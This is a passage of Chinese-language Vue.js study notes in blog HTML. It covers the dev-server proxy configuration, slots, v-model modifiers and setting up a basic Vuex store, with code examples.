class="xml"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="vue脚手架配置代理"><a href="#vue脚手架配置代理" class="headerlink" title="vue脚手架配置代理"></a>vue脚手架配置代理</h2><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202241626706.png" alt="image-20220224162658126"></p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>​    在vue.config.js中添加如下配置：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">devServer:&#123;</span><br><span class="line">  <span class="attr">proxy</span>:<span class="string">&quot;http://localhost:5000&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说明：</p><ol><li>优点：配置简单，请求资源时直接发给前端（8080）即可。</li><li>缺点：不能配置多个代理，不能灵活的控制请求是否走代理。</li><li>工作方式：若按照上述配置代理，当请求了前端不存在的资源时，那么该请求会转发给服务器 （优先匹配前端资源）</li></ol><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>​    编写vue.config.js配置具体代理规则：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line"><span class="attr">devServer</span>: &#123;</span><br><span class="line">      <span class="attr">proxy</span>: &#123;</span><br><span class="line">      <span class="string">&#x27;/api1&#x27;</span>: &#123;<span class="comment">// 匹配所有以 &#x27;/api1&#x27;开头的请求路径</span></span><br><span class="line">        <span class="attr">target</span>: <span class="string">&#x27;http://localhost:5000&#x27;</span>,<span class="comment">// 代理目标的基础路径</span></span><br><span class="line">        <span class="attr">changeOrigin</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">pathRewrite</span>: &#123;<span class="string">&#x27;^/api1&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&#x27;/api2&#x27;</span>: &#123;<span class="comment">// 匹配所有以 &#x27;/api2&#x27;开头的请求路径</span></span><br><span class="line">        <span class="attr">target</span>: <span class="string">&#x27;http://localhost:5001&#x27;</span>,<span class="comment">// 代理目标的基础路径</span></span><br><span class="line">        <span class="attr">changeOrigin</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">pathRewrite</span>: &#123;<span class="string">&#x27;^/api2&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   changeOrigin设置为true时，服务器收到的请求头中的host为：localhost:5000</span></span><br><span class="line"><span class="comment">   changeOrigin设置为false时，服务器收到的请求头中的host为：localhost:8080</span></span><br><span class="line"><span class="comment">   changeOrigin默认值为true</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>说明：</p><ol><li>优点：可以配置多个代理，且可以灵活的控制请求是否走代理。</li><li>缺点：配置略微繁琐，请求资源时必须加前缀。</li></ol><h3 id="ES6模板字符串"><a href="#ES6模板字符串" class="headerlink" title="ES6模板字符串"></a>ES6模板字符串</h3><p>ES6中提供了<strong>模版字符串，用`（反引号）标识，用${}将变量括起来。</strong>上面的例子可以用模版字符串写成下面这样：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;#result&quot;</span>).append(</span><br><span class="line"><span class="string">`He is &lt;b&gt;<span class="subst">$&#123;person.name&#125;</span>&lt;/b&gt;and we wish to know his<span class="subst">$&#123;person.age&#125;</span>.that is all`</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><h2 id="github案例"><a href="#github案例" class="headerlink" title="github案例"></a>github案例</h2><h3 id="vue封装xhr的插件vue-resource"><a href="#vue封装xhr的插件vue-resource" class="headerlink" title="vue封装xhr的插件vue-resource"></a>vue封装xhr的插件vue-resource</h3><p>引入vue-resource会在vc上增加一个属性$http</p><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202281600639.png" alt="image-20220228160048208"></p><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202281601102.png" alt="image-20220228160154089"></p><h2 id="插槽"><a href="#插槽" class="headerlink" title="插槽"></a>插槽</h2><ol><li><p>作用：让父组件可以向子组件指定位置插入html结构，也是一种组件间通信的方式，适用于 <strong style="color:red">父组件 ===&gt; 子组件</strong> 。</p></li><li><p>分类：默认插槽、具名插槽、作用域插槽</p></li><li><p>使用方式：</p><ol><li><p>默认插槽：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">父组件中：</span><br><span class="line">        &lt;Category&gt;</span><br><span class="line">           &lt;div&gt;html结构1&lt;/div&gt;</span><br><span class="line">        &lt;/Category&gt;</span><br><span class="line">子组件中：</span><br><span class="line">        &lt;template&gt;</span><br><span class="line">            &lt;div&gt;</span><br><span class="line">               &lt;!-- 定义插槽 --&gt;</span><br><span class="line">               &lt;slot&gt;插槽默认内容...&lt;/slot&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/template&gt;</span><br></pre></td></tr></table></figure></li><li><p>具名插槽：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">父组件中：</span><br><span class="line">        &lt;Category&gt;</span><br><span class="line">            &lt;template slot=&quot;center&quot;&gt;</span><br><span class="line">              &lt;div&gt;html结构1&lt;/div&gt;</span><br><span class="line">            &lt;/template&gt;</span><br><span class="line"></span><br><span class="line">            &lt;template v-slot:footer&gt;</span><br><span class="line">               &lt;div&gt;html结构2&lt;/div&gt;</span><br><span class="line">            &lt;/template&gt;</span><br><span class="line">        &lt;/Category&gt;</span><br><span class="line">子组件中：</span><br><span class="line">        &lt;template&gt;</span><br><span class="line">            &lt;div&gt;</span><br><span class="line">               &lt;!-- 定义插槽 --&gt;</span><br><span class="line">               &lt;slot name=&quot;center&quot;&gt;插槽默认内容...&lt;/slot&gt;</span><br><span class="line">               &lt;slot name=&quot;footer&quot;&gt;插槽默认内容...&lt;/slot&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/template&gt;</span><br></pre></td></tr></table></figure></li><li><p>作用域插槽：</p><ol><li><p>理解：<span style="color:red">数据在组件的自身，但根据数据生成的结构需要组件的使用者来决定。</span>（games数据在Category组件中，但使用数据所遍历出来的结构由App组件决定）</p></li><li><p>具体编码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">父组件中：</span><br><span class="line">&lt;Category&gt;</span><br><span class="line">&lt;template scope=&quot;scopeData&quot;&gt;</span><br><span class="line">&lt;!-- 生成的是ul列表 --&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">&lt;li v-for=&quot;g in scopeData.games&quot; :key=&quot;g&quot;&gt;&#123;&#123;g&#125;&#125;&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;/Category&gt;</span><br><span class="line"></span><br><span class="line">&lt;Category&gt;</span><br><span class="line">&lt;template slot-scope=&quot;scopeData&quot;&gt;</span><br><span class="line">&lt;!-- 生成的是h4标题 --&gt;</span><br><span class="line">&lt;h4 v-for=&quot;g in scopeData.games&quot; :key=&quot;g&quot;&gt;&#123;&#123;g&#125;&#125;&lt;/h4&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;/Category&gt;</span><br><span class="line">子组件中：</span><br><span class="line">        &lt;template&gt;</span><br><span class="line">            &lt;div&gt;</span><br><span class="line">                &lt;slot :games=&quot;games&quot;&gt;&lt;/slot&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/template&gt;</span><br><span class="line"></span><br><span class="line">        &lt;script&gt;</span><br><span class="line">            export default &#123;</span><br><span class="line">                name:&#x27;Category&#x27;,</span><br><span class="line">                props:[&#x27;title&#x27;],</span><br><span class="line">                //数据在子组件自身</span><br><span class="line">                data() &#123;</span><br><span class="line">                    return &#123;</span><br><span class="line">                        games:[&#x27;红色警戒&#x27;,&#x27;穿越火线&#x27;,&#x27;劲舞团&#x27;,&#x27;超级玛丽&#x27;]</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;</span><br><span class="line">        &lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ol></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">   </span><br></pre></td></tr></table></figure></li></ol><h2 id="Vuex"><a href="#Vuex" class="headerlink" title="Vuex"></a>Vuex</h2><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202203011457231.png" alt="image-20220301145734145"></p><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202203011512968.png" alt="image-20220301151213747"></p><h3 id="v-model修饰符"><a href="#v-model修饰符" class="headerlink" title="v-model修饰符"></a>v-model修饰符</h3><p>v-model的修饰符<br>v-model.lazy 只有在input输入框发生一个blur时才触发<br>v-model.trim 将用户输入的前后的空格去掉<br>v-model.number 将用户输入的字符串转换成number<br>在input textarea select中使用</p><p>以下代码都没有写出js部分，请在data中自行添加对应属性。</p><p>当使用v-model将input输入框与name绑定那么输入框改变的同时name的值也会同步的发生改变</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> v-model=<span class="string">&quot;name&quot;</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span> &#123;&#123; name &#125;&#125; <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>但是，这样会对使用有影响，所以我们可以用v-model的修饰符lazy</p><p>v-model.lazy 只有在input输入框发生一个blur时才触发</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> v-model.lazy=<span class="string">&quot;name&quot;</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span> &#123;&#123; name &#125;&#125; <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>v-model.trim 将用户输入的前后的空格去掉,我们在输入框中输入很多空格后再输入内容，下面的span还是原来那样的，不会多出空格，原因是HTML只显示一个空格，但是name的值就不一样了，它会将这些空格算上，我们可以在span上加一个pre标签，这时这些空格就会显示出来</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> v-model=<span class="string">&quot;name&quot;</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">pre</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span> &#123;&#123; name &#125;&#125; <span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>v-model.trim就是用来清除这些多余的空格的，当然如果是密码等输入框，请不要加此修饰，有些用户会用空格做密码。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> v-model.trim=<span class="string">&quot;name&quot;</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">pre</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span> &#123;&#123; name &#125;&#125; <span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>这时你无论给它前后加多少空格都会被清除掉。</p><p>v-model.number 将用户输入的字符串转换成number</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> v-model=<span class="string">&quot;age&quot;</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span> &#123;&#123;typeof age &#125;&#125; <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>这种情况下，你输入的数字会被自动转换成字符串，如果加上.number</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> v-model.number=<span class="string">&quot;age&quot;</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span> &#123;&#123;typeof age &#125;&#125; <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>这样就会把你输入的数字转换成number，如果你在输入框中输入非number，那么在blur时，从第一个非number处后main就会全部被清除掉。</p><p>v-model在input textarea select中使用，前面我们都是在input的type = text中使用的，在textarea中和它是一样的，唯一区别是这个是多行的。</p><p>在type为radio中使用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">你的性别是？</span><br><span class="line">男：&lt;input v-model=<span class="string">&quot;sex&quot;</span> type=<span class="string">&quot;radio&quot;</span> value=<span class="string">&quot;male&quot;</span>&gt;</span><br><span class="line">女：&lt;input v-model=<span class="string">&quot;sex&quot;</span> type=<span class="string">&quot;radio&quot;</span> value=<span class="string">&quot;famale&quot;</span>&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span> &#123;&#123; sex &#125;&#125; <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>这时选中哪个，sex的值就是其value</p><p>在type为checkbox中使用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">你的性取向是：</span><br><span class="line">男：&lt;input v-model=<span class="string">&quot;sexual_orientation&quot;</span> type=<span class="string">&quot;checkbox&quot;</span> value=<span class="string">&quot;male&quot;</span>&gt;</span><br><span class="line">女：&lt;input v-model=<span class="string">&quot;sexual_orientation&quot;</span> type=<span class="string">&quot;checkbox&quot;</span> value=<span class="string">&quot;famale&quot;</span>&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span> &#123;&#123; sexual_orientation &#125;&#125; <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>在多选时，要把data区中的v-model绑定的属性（sexual_orientation）设置成一个数组。</p><p>在select中使用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">你的家乡在哪？</span><br><span class="line">&lt;select v-model=<span class="string">&quot;from&quot;</span> name=<span class="string">&quot;&quot;</span> id=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">option</span> <span class="attr">name</span>=<span class="string">&quot;湖北&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span>湖北<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">option</span> <span class="attr">name</span>=<span class="string">&quot;湖南&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>&gt;</span>湖南<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span></span><br><span class="line">&lt;/select&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; from &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>select中也可以多选</p><p>你想去哪？</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;select v-model=<span class="string">&quot;from&quot;</span> name=<span class="string">&quot;&quot;</span> id=<span class="string">&quot;&quot;</span> multiple&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">option</span> <span class="attr">name</span>=<span class="string">&quot;湖北&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span>湖北<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">option</span> <span class="attr">name</span>=<span class="string">&quot;湖南&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>&gt;</span>湖南<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">option</span> <span class="attr">name</span>=<span class="string">&quot;湖南&quot;</span> <span class="attr">value</span>=<span class="string">&quot;3&quot;</span>&gt;</span>河北<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">option</span> <span class="attr">name</span>=<span class="string">&quot;湖南&quot;</span> <span class="attr">value</span>=<span class="string">&quot;4&quot;</span>&gt;</span>河南<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span></span><br><span class="line">&lt;/select&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; from &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a>1.概念</h3><p>​        在Vue中实现集中式状态（数据）管理的一个Vue插件，对vue应用中多个组件的共享状态进行集中式的管理（读/写），也是一种组件间通信的方式，且适用于任意组件间通信。</p><h3 id="2-何时使用？"><a href="#2-何时使用？" class="headerlink" title="2.何时使用？"></a>2.何时使用？</h3><p>​        多个组件需要共享数据时</p><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202203011557454.png" alt="image-20220301155725368"></p><h3 id="3-搭建vuex环境"><a href="#3-搭建vuex环境" class="headerlink" title="3.搭建vuex环境"></a>3.搭建vuex环境</h3><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202203011650297.png" alt="image-20220301165009108"></p><ol><li><p>创建文件：<code>src/store/index.js</code></p><p>使用vuex后会可以引入store对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//引入Vue核心库</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="comment">//引入Vuex</span></span><br><span class="line"><span class="keyword">import</span> Vuex <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span></span><br><span class="line"><span class="comment">//应用Vuex插件</span></span><br><span class="line">Vue.use(Vuex)</span><br><span class="line"></span><br><span class="line"><span class="comment">//准备actions对象——响应组件中用户的动作</span></span><br><span class="line"><span class="keyword">const</span> actions = &#123;&#125;</span><br><span class="line"><span class="comment">//准备mutations对象——修改state中的数据</span></span><br><span class="line"><span class="keyword">const</span> mutations = &#123;&#125;</span><br><span class="line"><span class="comment">//准备state对象——保存具体的数据</span></span><br><span class="line"><span class="keyword">const</span> state = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建并暴露store</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">actions,</span><br><span class="line">mutations,</span><br><span class="line">state</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>在<code>main.js</code>中创建vm时传入<code>store</code>配置项</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="comment">//引入store</span></span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&#x27;./store&#x27;</span></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建vm</span></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line"><span class="attr">el</span>:<span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line"><span class="attr">render</span>: <span class="function"><span class="params">h</span> =&gt;</span> h(App),</span><br><span class="line">store</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ol><h3 id="4-基本使用"><a href="#4-基本使用" class="headerlink" title="4.基本使用"></a>4.基本使用</h3><ol><li><p>初始化数据、配置<code>actions</code>、配置<code>mutations</code>，操作文件<code>store.js</code></p><p>使用的是store文件夹下的index.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//引入Vue核心库</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="comment">//引入Vuex</span></span><br><span class="line"><span class="keyword">import</span> Vuex <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span></span><br><span class="line"><span class="comment">//引用Vuex</span></span><br><span class="line">Vue.use(Vuex)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> actions = &#123;</span><br><span class="line">    <span class="comment">//响应组件中加的动作</span></span><br><span class="line"><span class="function"><span class="title">jia</span>(<span class="params">context,value</span>)</span>&#123;</span><br><span class="line"><span class="comment">// console.log(&#x27;actions中的jia被调用了&#x27;,miniStore,value)</span></span><br><span class="line">context.commit(<span class="string">&#x27;JIA&#x27;</span>,value)</span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> mutations = &#123;</span><br><span class="line">    <span class="comment">//执行加</span></span><br><span class="line"><span class="function"><span class="title">JIA</span>(<span class="params">state,value</span>)</span>&#123;</span><br><span class="line"><span class="comment">// console.log(&#x27;mutations中的JIA被调用了&#x27;,state,value)</span></span><br><span class="line">state.sum += value</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化数据</span></span><br><span class="line"><span class="keyword">const</span> state = &#123;</span><br><span class="line">   <span class="attr">sum</span>:<span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建并暴露store</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">actions,</span><br><span class="line">mutations,</span><br><span class="line">state,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>Count.vue</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>当前求和的为:&#123;&#123;$store.state.sum&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">select</span> <span class="attr">v-model.number</span>=<span class="string">&quot;n&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>&gt;</span>2<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;3&quot;</span>&gt;</span>3<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;increment&quot;</span>&gt;</span>+<span class="tag">&lt;/<span 